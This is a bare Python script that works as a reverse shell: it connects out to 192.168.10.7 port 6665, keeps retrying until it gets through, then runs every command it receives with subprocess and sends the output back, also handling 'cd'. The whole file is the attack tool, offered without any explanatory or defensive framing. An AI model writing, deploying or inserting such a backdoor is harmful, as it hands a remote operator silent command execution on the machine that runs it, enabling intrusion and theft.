import socket
import os
import time
import subprocess

def exec(data):
    try:
        try:
            execute=subprocess.run(data, capture_output=True)       
        except:
            print("command is not working")
            data=""
            rcev()
        execute=execute.stdout.decode('utf-8')
        send=execute.encode('utf-8')
        reply=s.send(send)
        rcev()
    except KeyboardInterrupt():
        print("exiting...")
        s.close()     
    except:      
        print("exec not working")
        s.close()
def rcev():
    try:
        while True:
            bdata=s.recv(1024)
            data=bdata.decode('utf-8')
            split=data.split()
            print(split[0])
            if(data=="quit"):
                break
            elif(split[0]=='cd'):
                os.chdir(''.join(split[1:]))
                rcev()
            else:
                exec(data) 
    except KeyboardInterrupt():
        print("exiting...")
        s.close()    
    except:
        s.close()
        print("something is not working in rcev")
        
def connect():
    try:
        time.sleep(2)
        s.connect(('192.168.10.7',6665))
        print("connected!")
    except:
        print("-->  trying to reconnect..")
        connect()

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect()
rcev()
s.close()
